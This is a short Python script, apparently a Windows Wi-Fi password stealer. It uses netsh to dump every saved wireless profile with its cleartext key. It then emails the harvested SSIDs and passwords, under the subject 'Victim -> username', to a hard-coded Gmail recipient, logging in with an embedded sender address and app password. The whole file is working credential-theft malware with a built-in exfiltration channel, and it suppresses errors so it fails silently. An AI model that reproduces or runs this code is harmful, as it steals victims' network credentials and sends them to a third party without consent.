import subprocess
import re
from os import getlogin as username
import threading 
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

passwords = []

def PASSWORD(SSID):
    try:
        wifi = subprocess.check_output(['netsh', 'wlan', 'show', 'profile' , SSID , "key=clear"], text=False)
    except :
        pass
    pattern2 = re.compile(r"   Key Content            : [A-Za-z0-9.!@#$%_&*():\"\'-+]+")
    matches = pattern2.finditer(wifi.decode())
    global passwords
    for match in matches :
        passwords.append(f"SSID : {SSID} , Password : {match[0][28:]}")
        
def SSID():
    try:
        output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=False)
    except :
        exit()
            
    pattern = re.compile(r": [ A-Za-z0-9_-]+")
    matches = pattern.finditer(output.decode())
    wifi_SSID , threads = [] , []
    for match in matches:
        wifi_SSID.append(match[0][2:])

    for SSID in wifi_SSID :
        t = threading.Thread(target=PASSWORD , args=(SSID,))
        t.start()
        threads.append(t)

    for thread in threads:
        thread.join()
        
def send_email(sender_email, sender_password, recipient_email, subject, body):
    msg = MIMEMultipart()
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = recipient_email
    
    body = "\n".join(body) if body else "No passwords were found!"
    msg.attach(MIMEText(body, "plain"))

    try:
        with smtplib.SMTP('smtp.gmail.com', 587) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.send_message(msg)
    except :
        pass



if __name__ == "__main__":
    subject = f"Victim -> {username()}"
    SSID() 
    body = passwords
    sender_email = 'iamqwertyfish@gmail.com'
    sender_password = 'gvnm rkpy mbgc yahs'
    recipient_email = 'sepiolsam2023@gmail.com'

    try:
        send_email(sender_email=sender_email , sender_password=sender_password , recipient_email=recipient_email 
                   , subject=subject , body=body)
    except :
        pass  
